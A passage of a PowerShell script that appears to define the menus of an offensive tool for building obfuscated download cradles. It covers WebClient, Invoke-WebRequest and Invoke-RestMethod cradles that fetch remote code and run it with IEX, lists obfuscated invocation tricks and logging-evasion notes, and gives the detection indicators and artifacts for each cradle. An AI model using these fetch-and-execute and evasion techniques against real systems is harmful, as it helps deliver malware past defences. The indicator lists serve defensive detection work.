    $MenuContext_Memory_NetWebString             += , @('Description  ','.NET version of PsWebString, downloads the requested resource as a String')
    $MenuContext_Memory_NetWebString             += , @('Compatibility','PS 3.0+')
    $MenuContext_Memory_NetWebString             += , @('Dependencies ','N/A')
    $MenuContext_Memory_NetWebString             += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry'))
    $MenuContext_Memory_NetWebString             += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_NetWebString             += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_NetWebString             += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 4
        
    $MenuLevel_Memory_NetWebString                =   @()
    $MenuLevel_Memory_NetWebString               += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_NetWebString               += , @($LineSpacing, 'Class    ' , '<[Net.WebClient]>')
    $MenuLevel_Memory_NetWebString               += , @($LineSpacing, 'Method   ' , '<DownloadString>')
    $MenuLevel_Memory_NetWebString               += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_NetWebString               += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_NetWebString_Rearrange      =   @()
    $MenuLevel_Memory_NetWebString_Rearrange     += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_NetWebString_Rearrange     += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_NetWebString_Rearrange     += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Memory_NetWebString_Class          =   @()
    $MenuLevel_Memory_NetWebString_Class         += , @($LineSpacing, '1' , "Default   --> <[System.Net.WebClient]>"                       , @('Out-Cradle', $CradleType, 'NetWebClient', 1))
    $MenuLevel_Memory_NetWebString_Class         += , @($LineSpacing, '2' , "Shortened --> <[Net.WebClient]>"                              , @('Out-Cradle', $CradleType, 'NetWebClient', 2))
    
    $MenuLevel_Memory_NetWebString_Method         =   @()
    $MenuLevel_Memory_NetWebString_Method        += , @($LineSpacing, '1' , "PS DownloadString --> <DownloadString>"                       , @('Out-Cradle', $CradleType, 'DownloadString', 1))
    $MenuLevel_Memory_NetWebString_Method        += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'DownloadString', 2))
    $MenuLevel_Memory_NetWebString_Method        += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'DownloadString', 3))
    
    $MenuLevel_Memory_NetWebString_Invoke         =   @()
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_NetWebString_Invoke        += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_NetWebString_All            =   @()
    $MenuLevel_Memory_NetWebString_All           += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_NetWebData                =   @()
    $MenuContext_Memory_NetWebData               += , @('Name         ','NetWebData')
    $MenuContext_Memory_NetWebData               += , @('Description  ','.NET version of PsWebData, downloads resource as Byte array from specified URI')
    $MenuContext_Memory_NetWebData               += , @('Compatibility','PS 3.0+')
    $MenuContext_Memory_NetWebData               += , @('Dependencies ','N/A')
    $MenuContext_Memory_NetWebData               += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry'))
    $MenuContext_Memory_NetWebData               += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_NetWebData               += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_NetWebData               += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 5
        
    $MenuLevel_Memory_NetWebData                  =   @()
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Class    ' , '<[Net.WebClient]>')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Method   ' , '<DownloadData>')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Join     ' , '$Array<-Join''''>')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Byte     ' , '<[Char[]]>$Bytes')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_NetWebData                 += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_NetWebData_Rearrange        =   @()
    $MenuLevel_Memory_NetWebData_Rearrange       += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_NetWebData_Rearrange       += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_NetWebData_Rearrange       += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))
    
    $MenuLevel_Memory_NetWebData_Class            =   @()
    $MenuLevel_Memory_NetWebData_Class           += , @($LineSpacing, '1' , "Default   --> <[System.Net.WebClient]>"                       , @('Out-Cradle', $CradleType, 'NetWebClient', 1))
    $MenuLevel_Memory_NetWebData_Class           += , @($LineSpacing, '2' , "Shortened --> <[Net.WebClient]>"                              , @('Out-Cradle', $CradleType, 'NetWebClient', 2))
    
    $MenuLevel_Memory_NetWebData_Method           =   @()
    $MenuLevel_Memory_NetWebData_Method          += , @($LineSpacing, '1' , "PS DownloadData   --> <DownloadData>"                         , @('Out-Cradle', $CradleType, 'DownloadData', 1))
    $MenuLevel_Memory_NetWebData_Method          += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'DownloadData', 2))
    $MenuLevel_Memory_NetWebData_Method          += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'DownloadData', 3))
    
    $MenuLevel_Memory_NetWebData_Join             =   @()
    $MenuLevel_Memory_NetWebData_Join            += , @($LineSpacing, '1' , "PS Join    --> `$Array<-Join''>"                              , @('Out-Cradle', $CradleType, 'Join', 1))
    $MenuLevel_Memory_NetWebData_Join            += , @($LineSpacing, '2' , "PS Join 2  --> <-Join>`$Array"                                , @('Out-Cradle', $CradleType, 'Join', 2))
    $MenuLevel_Memory_NetWebData_Join            += , @($LineSpacing, '3' , ".Net Join  --> <[String]::Join('',>`$Array<)>"                , @('Out-Cradle', $CradleType, 'Join', 3))

    $MenuLevel_Memory_NetWebData_Byte             =   @()
    $MenuLevel_Memory_NetWebData_Byte            += , @($LineSpacing, '1' , "PS [Char[]]  --> <[Char[]]>`$Bytes"                           , @('Out-Cradle', $CradleType, 'Byte', 1))
    $MenuLevel_Memory_NetWebData_Byte            += , @($LineSpacing, '2' , "PS [Char]    --> `$Bytes|%{<[Char]>`$_}"                      , @('Out-Cradle', $CradleType, 'Byte', 2))    
    $MenuLevel_Memory_NetWebData_Byte            += , @($LineSpacing, '3' , ".Net ASCII   --> <[Text.Encoding]::ASCII.GetString>"          , @('Out-Cradle', $CradleType, 'Byte', 3))
    $MenuLevel_Memory_NetWebData_Byte            += , @($LineSpacing, '4' , "PS -As Char  --> `$Bytes|%{`$_<-As'Char'>}"                   , @('Out-Cradle', $CradleType, 'Byte', 4))

    $MenuLevel_Memory_NetWebData_Invoke           =   @()
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '1'  , "`tNo Invoke         --> For <testing> download sans IEX"     , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '2'  , "`tPS IEX            --> <IEX/Invoke-Expression>"             , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '3'  , "`tPS Get-Alias      --> <Get-Alias>/<GAL>"                   , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '4'  , "`tPS Get-Command    --> <Get-Command>/<GCM>"                 , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '5'  , "`tPS1.0 GetCmdlet   --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '6'  , "`tPS1.0 Invoke      --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '7'  , "`tScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"      , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '8'  , "`tPS Runspace       --> <[PowerShell]::Create()> (StdOut)"   , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '9'  , "`tConcatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"  , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_NetWebData_Invoke          += , @($LineSpacing, '10' , "`tInvoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"        , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_NetWebData_All              =   @()
    $MenuLevel_Memory_NetWebData_All             += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_NetWebOpenRead            =   @()
    $MenuContext_Memory_NetWebOpenRead           += , @('Name         ','NetWebOpenRead')
    $MenuContext_Memory_NetWebOpenRead           += , @('Description  ','.NET version of PsWebOpenRead, opens readable stream for data downloaded from the URI')
    $MenuContext_Memory_NetWebOpenRead           += , @('Compatibility','PS 2.0+')
    $MenuContext_Memory_NetWebOpenRead           += , @('Dependencies ','N/A')
    $MenuContext_Memory_NetWebOpenRead           += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry'))
    $MenuContext_Memory_NetWebOpenRead           += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_NetWebOpenRead           += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_NetWebOpenRead           += , @('User-Agent   ',@('None','UA generally trivial to change'))

    $CradleType = 6
        
    $MenuLevel_Memory_NetWebOpenRead              =   @()
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'Class    ' , '<[Net.WebClient]>')
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'Method   ' , '<OpenRead>')
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'Stream   ' , '<StreamReader>/<ReadByte>')
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_NetWebOpenRead             += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_NetWebOpenRead_Rearrange    =   @()
    $MenuLevel_Memory_NetWebOpenRead_Rearrange   += , @($LineSpacing, '1' , "Default          --> <Default> syntax arrangement"            , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_NetWebOpenRead_Rearrange   += , @($LineSpacing, '2' , "Random-Variable  --> <Random> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    
    $MenuLevel_Memory_NetWebOpenRead_Class        =   @()
    $MenuLevel_Memory_NetWebOpenRead_Class       += , @($LineSpacing, '1' , "Default   --> <[System.Net.WebClient]>"                       , @('Out-Cradle', $CradleType, 'NetWebClient', 1))
    $MenuLevel_Memory_NetWebOpenRead_Class       += , @($LineSpacing, '2' , "Shortened --> <[Net.WebClient]>"                              , @('Out-Cradle', $CradleType, 'NetWebClient', 2))
    
    $MenuLevel_Memory_NetWebOpenRead_Method       =   @()
    $MenuLevel_Memory_NetWebOpenRead_Method      += , @($LineSpacing, '1' , "PS OpenRead       --> <OpenRead>"                             , @('Out-Cradle', $CradleType, 'OpenRead', 1))
    $MenuLevel_Memory_NetWebOpenRead_Method      += , @($LineSpacing, '2' , "PS PsObject       --> <.PsObject.Methods>"                    , @('Out-Cradle', $CradleType, 'OpenRead', 2))
    $MenuLevel_Memory_NetWebOpenRead_Method      += , @($LineSpacing, '3' , "PS Get-Member     --> <| Get-Member>"                         , @('Out-Cradle', $CradleType, 'OpenRead', 3))

    $MenuLevel_Memory_NetWebOpenRead_Stream       =   @()
    $MenuLevel_Memory_NetWebOpenRead_Stream      += , @($LineSpacing, '1' , "PS StreamReader   --> New-Object <IO.StreamReader>"           , @('Out-Cradle', $CradleType, 'Stream2', 1))
    $MenuLevel_Memory_NetWebOpenRead_Stream      += , @($LineSpacing, '2' , "PS StreamReader 2 --> One-Liner <IO.StreamReader>"            , @('Out-Cradle', $CradleType, 'Stream2', 2))
    $MenuLevel_Memory_NetWebOpenRead_Stream      += , @($LineSpacing, '3' , "PS ReadByte       --> While(1){`$res<.ReadByte()>}"           , @('Out-Cradle', $CradleType, 'Stream2', 3))
    
    $MenuLevel_Memory_NetWebOpenRead_Invoke       =   @()
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_NetWebOpenRead_Invoke      += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_NetWebOpenRead_All          =   @()
    $MenuLevel_Memory_NetWebOpenRead_All         += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsWebRequest              =   @()
    $MenuContext_Memory_PsWebRequest             += , @('Name         ','PsWebRequest')
    $MenuContext_Memory_PsWebRequest             += , @('Description  ',@('Web request with response parsed nicely into collections','Works in CLM (Constrained Language Mode)'))
    $MenuContext_Memory_PsWebRequest             += , @('Compatibility','PS 3.0+')
    $MenuContext_Memory_PsWebRequest             += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsWebRequest             += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry'))
    $MenuContext_Memory_PsWebRequest             += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsWebRequest             += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsWebRequest             += , @('User-Agent   ','Mozilla/* (Windows NT; Windows NT *; *) WindowsPowerShell/*')

    $CradleType = 7
        
    $MenuLevel_Memory_PsWebRequest                =   @()
    $MenuLevel_Memory_PsWebRequest               += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsWebRequest               += , @($LineSpacing, 'Cmdlet   ' , '<Invoke-WebRequest>/<IWR>')
    $MenuLevel_Memory_PsWebRequest               += , @($LineSpacing, 'Property ' , '<Content>')
    $MenuLevel_Memory_PsWebRequest               += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsWebRequest               += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsWebRequest_Rearrange      =   @()
    $MenuLevel_Memory_PsWebRequest_Rearrange     += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsWebRequest_Rearrange     += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsWebRequest_Rearrange     += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Memory_PsWebRequest_Cmdlet         =   @()
    $MenuLevel_Memory_PsWebRequest_Cmdlet        += , @($LineSpacing, '1' , "PS Invoke-WebRequest --> <Invoke-WebRequest>/<IWR>"           , @('Out-Cradle', $CradleType, 'InvokeWebRequest', 1))
    $MenuLevel_Memory_PsWebRequest_Cmdlet        += , @($LineSpacing, '2' , "PS (Alias) WGET/CURL --> <WGET>/<CURL>"                       , @('Out-Cradle', $CradleType, 'InvokeWebRequest', 2))
    $MenuLevel_Memory_PsWebRequest_Cmdlet        += , @($LineSpacing, '3' , "PS Get-Command       --> <Get-Command>/<GCM>"                 , @('Out-Cradle', $CradleType, 'InvokeWebRequest', 3))
    $MenuLevel_Memory_PsWebRequest_Cmdlet        += , @($LineSpacing, '4' , "PS1.0 GetCmdlet      --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'InvokeWebRequest', 4))
    
    $MenuLevel_Memory_PsWebRequest_Property       =   @()
    $MenuLevel_Memory_PsWebRequest_Property      += , @($LineSpacing, '1' , "PS Content     --> <Content>"                                 , @('Out-Cradle', $CradleType, 'Content2', 1))
    $MenuLevel_Memory_PsWebRequest_Property      += , @($LineSpacing, '2' , "PS String      --> <.ToString()>/<[String]>"                  , @('Out-Cradle', $CradleType, 'Content2', 2))
    $MenuLevel_Memory_PsWebRequest_Property      += , @($LineSpacing, '3' , "PS PsObject    --> <.PsObject.Methods>"                       , @('Out-Cradle', $CradleType, 'Content2', 3))
    $MenuLevel_Memory_PsWebRequest_Property      += , @($LineSpacing, '4' , "PS Get-Member  --> <| Get-Member>"                            , @('Out-Cradle', $CradleType, 'Content2', 4))
    
    $MenuLevel_Memory_PsWebRequest_Invoke         =   @()
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '8'  , "PS Runspace       --> <[PowerShell]::Create()> (StdOut)"     , @('Out-Cradle', $CradleType, 'Invoke', 8))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '9'  , "Concatenated IEX  --> <.(`$env:ComSpec[4,15,25]-Join'')>"    , @('Out-Cradle', $CradleType, 'Invoke', 9))
    $MenuLevel_Memory_PsWebRequest_Invoke        += , @($LineSpacing, '10' , "Invoke-AsWorkflow --> <Invoke-AsWorkflow> (PS3.0+)"          , @('Out-Cradle', $CradleType, 'Invoke', 10))

    $MenuLevel_Memory_PsWebRequest_All            =   @()
    $MenuLevel_Memory_PsWebRequest_All           += , @($LineSpacing, '1' , "Execute <ALL> Token obfuscation techniques (random order)"    , @('Out-Cradle', $CradleType, 'All', 1))
    
    # Set values for Show-MenuContext to be displayed when each new cradle type is entered into.
    $MenuContext_Memory_PsRestMethod              =   @()
    $MenuContext_Memory_PsRestMethod             += , @('Name         ','PsRestMethod')
    $MenuContext_Memory_PsRestMethod             += , @('Description  ',@('Web request to REST web service with response returned as structured data','Works in CLM (Constrained Language Mode)'))
    $MenuContext_Memory_PsRestMethod             += , @('Compatibility','PS 3.0+')
    $MenuContext_Memory_PsRestMethod             += , @('Dependencies ','N/A')
    $MenuContext_Memory_PsRestMethod             += , @('Footprint    ',@('Entirely memory-based','No New-Object cmdlet module log entry'))
    $MenuContext_Memory_PsRestMethod             += , @('Indicators   ',@('powershell.exe loads C:\Windows\System32\rasman.dll','powershell.exe loads C:\Windows\System32\rasapi32.dll'))
    $MenuContext_Memory_PsRestMethod             += , @('Artifacts    ',@('C:\Windows\Prefetch\POWERSHELL.EXE-********.pf','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASMANCS','HKLM\SOFTWARE\Microsoft\Tracing\powershell_RASAPI32'))
    $MenuContext_Memory_PsRestMethod             += , @('User-Agent   ','Mozilla/* (Windows NT; Windows NT *; *) WindowsPowerShell/*')

    $CradleType = 8
        
    $MenuLevel_Memory_PsRestMethod                =   @()
    $MenuLevel_Memory_PsRestMethod               += , @($LineSpacing, 'Rearrange' , '<Rearrange> syntax structure')
    $MenuLevel_Memory_PsRestMethod               += , @($LineSpacing, 'Cmdlet   ' , '<Invoke-RestMethod>/<IRM>')
    $MenuLevel_Memory_PsRestMethod               += , @($LineSpacing, 'Invoke   ' , '<IEX>')
    $MenuLevel_Memory_PsRestMethod               += , @($LineSpacing, 'All      ' , 'Select <All> choices from above (random order)')

    $MenuLevel_Memory_PsRestMethod_Rearrange      =   @()
    $MenuLevel_Memory_PsRestMethod_Rearrange     += , @($LineSpacing, '1' , "Default         --> <Default> syntax arrangement"             , @('Out-Cradle', $CradleType, 'Rearrange', 1))
    $MenuLevel_Memory_PsRestMethod_Rearrange     += , @($LineSpacing, '2' , "Multi-Variable  --> <Logical> variable names and syntax"      , @('Out-Cradle', $CradleType, 'Rearrange', 2))
    $MenuLevel_Memory_PsRestMethod_Rearrange     += , @($LineSpacing, '3' , "Random-Variable --> <Random> variable names and syntax"       , @('Out-Cradle', $CradleType, 'Rearrange', 3))

    $MenuLevel_Memory_PsRestMethod_Cmdlet         =   @()
    $MenuLevel_Memory_PsRestMethod_Cmdlet        += , @($LineSpacing, '1' , "PS Invoke-RestMethod --> <Invoke-RestMethod>/<IRM>"           , @('Out-Cradle', $CradleType, 'InvokeRestMethod', 1))
    $MenuLevel_Memory_PsRestMethod_Cmdlet        += , @($LineSpacing, '2' , "PS Get-Command       --> <Get-Command>/<GCM>"                 , @('Out-Cradle', $CradleType, 'InvokeRestMethod', 2))
    $MenuLevel_Memory_PsRestMethod_Cmdlet        += , @($LineSpacing, '3' , "PS1.0 GetCmdlet      --> <`$ExecutionContext>..."             , @('Out-Cradle', $CradleType, 'InvokeRestMethod', 3))
        
    $MenuLevel_Memory_PsRestMethod_Invoke         =   @()
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '1'  , "No Invoke         --> For <testing> download sans IEX"       , @('Out-Cradle', $CradleType, 'Invoke', 1))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '2'  , "PS IEX            --> <IEX/Invoke-Expression>"               , @('Out-Cradle', $CradleType, 'Invoke', 2))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '3'  , "PS Get-Alias      --> <Get-Alias>/<GAL>"                     , @('Out-Cradle', $CradleType, 'Invoke', 3))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '4'  , "PS Get-Command    --> <Get-Command>/<GCM>"                   , @('Out-Cradle', $CradleType, 'Invoke', 4))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '5'  , "PS1.0 GetCmdlet   --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 5))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '6'  , "PS1.0 Invoke      --> <`$ExecutionContext>..."               , @('Out-Cradle', $CradleType, 'Invoke', 6))
    $MenuLevel_Memory_PsRestMethod_Invoke        += , @($LineSpacing, '7'  , "ScriptBlock+ICM   --> <ICM/Invoke-Command/.Invoke()>"        , @('Out-Cradle', $CradleType, 'Invoke', 7))
